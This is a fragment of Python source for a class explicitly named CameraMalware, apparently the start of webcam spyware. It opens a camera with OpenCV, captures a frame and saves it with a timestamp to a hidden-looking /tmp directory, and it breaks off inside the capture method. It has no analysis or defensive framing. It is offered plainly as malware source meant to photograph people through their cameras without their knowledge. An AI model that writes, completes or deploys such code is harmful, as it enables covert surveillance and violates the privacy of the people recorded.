import cv2
import time
import os
import subprocess
from datetime import datetime

class CameraMalware:
    def __init__(self):
        self.camera = None
        self.output_dir = "/tmp/captured"
        os.makedirs(self.output_dir, exist_ok=True)
        
    def capture_image(self, camera_index=0):
        """Capture image from specified camera"""
        try:
            # Initialize camera
            self.camera = cv2.VideoCapture(camera_index)
            
            if not self.camera.isOpened():
                print(f"Failed to open camera {camera_index}")
                return False
            
            # Capture frame
            ret, frame = self.camera.read()
            if ret:
                # Save image with timestamp
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{self.output_dir}/capture_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                print(f"Image captured: {filename}")